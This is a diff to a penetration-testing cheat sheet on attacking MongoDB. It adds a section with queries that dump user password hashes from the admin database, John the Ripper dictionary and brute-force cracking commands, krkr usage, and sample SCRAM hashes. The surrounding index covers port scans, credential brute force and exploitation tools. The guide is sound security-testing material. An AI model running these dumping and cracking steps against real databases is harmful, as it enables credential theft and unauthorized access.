@@ -8,12 +8,13 @@ INDEX
 02. How to perform a network TCP ports scan to locate a MongoDB database
 03. How to perform a password brute-force attack to identify valid database credentials (logins/passwords)
 04. How to log into a MongoDB database using valid credentials and extract its configuration
-05. How to audit/test the security posture of a MongoDB (tools: mongoaudit, nosqlmap)
-
+05. How to audit/test the security posture of a MongoDB (tools: mongoaudit, nosqlmap, nosql-exploitation-framework)
+06. How to dump and crack MongoDB password hashes
 
 ==========================================================================================================
 01. General information
 ==========================================================================================================
+• MongoDB is a cross-platform document-oriented database program. MongoDB is classified as a NoSQL database program.
 
 • MongoDB concepts
   + A database holds a set of collections
@@ -25,7 +26,6 @@ INDEX
   + a document, or
   + an array of values
 
-• It's a "document-orientated" database (otherwise known as a NoSQL database).
 • Typically, NoSQL DB's use XML, YAML, JSON, and BSON to encode the data. MongoDB uses Binary JSON (BSON).
 • NoSQL databases have their own terminology that is different from typical relational databases such as MSSQL and MySQL:
   + Document = Row or Record
@@ -591,6 +591,77 @@ Note: The configuration file "/etc/mongod.conf" must be reviewed.
 		Select a database to steal: 2
 		Does this database require credentials (y/n)? n
 
+==========================================================================================================
+06. How to dump and crack MongoDB password hashes
+==========================================================================================================
+
+The system.users collection in the admin database stores user authentication and authorization information 
+(including password hashes). 
+
+1. Manual password hashes dump
+--------------------------------
+Example of Mongodb commands that allow to list the users and their password hashes.
+
+Option 1 
+> use admin
+> db.getUsers( {showCredentials: true,  filter: { mechanisms: "SCRAM-SHA-256" }} )
+
+Option 2
+> use admin
+> db.system.users.find()
+> db.system.users.findOne({user: "testUser"})
+	{
+	    "_id" : "admin.testUser",
+	    "user" : "testUser",
+	    "db" : "testdb",
+	    "credentials" : {
+		"SCRAM-SHA-1" : {
+		    "iterationCount" : 10000,
+		    "salt" : "+seF99VS0sZFe30VPBHA7A==",
+		    "storedKey" : "DYPbk/QJVowCNDPe2O2uWMmGq8U=",
+		    "serverKey" : "q4KAi4pVZNOLCgWcxcBr7jkM3m8="
+		}
+	    },
+	    "roles" : [
+		{
+		    "role" : "readWrite",
+		    "db" : "testDb"
+
+
+2. Password hashes cracking using John The Ripper
+--------------------------------------------------
+• Password dictionary attack
+  pentester@LinuxVM > john --wordlist=dico.txt --rules --session=1 --format=MongoDB file_with_hashes.txt
+  pentester@LinuxVM > john --show file_with_hashes.txt
+  
+• Password bruteforce attack
+  pentester@LinuxVM > john --session=2 --format=MongoDB file_with_hashes.txt	
+  pentester@LinuxVM > john --show file_with_hashes.txt
+
+
+3. Password hashes cracking using the tool 'krkr'
+-------------------------------------------------
+=> https://github.com/averagesecurityguy/krkr
+
+> Usage of ./krkr:
+  -f string
+   File containing password hashes. (default "hashes.txt")
+  -t string
+   The type of hash to crack. (default "none")
+  -w string
+   Password list (default "words.txt")
+	
+> Supported Hashes
+  - Mongodb SCRAM-SHA1
+  - Mongodb CR
+
+> Example - File containing SCRAM-SHA1 password hashes
+admin:admin:$scram$10000$/RvNLt7idKDYqnpgjrFDPA==$O0vYca487a4JwOFxsYC4xkWR+Ro=
+admin:test:$scram$10000$4lwAAO2i6neGV8OphKpDYQ==$NOp7p/jpShihGcemtrh38Xy8Vbs=
+testuser:testuser:$scram$10000$seF99VS0sZFe30VPBHA7A==$DYPbk/QJVowCNDPe2O2uWMmGq8U=
+
+
+==========================================================================================================
 
 OTHER / NOTES
 ===============
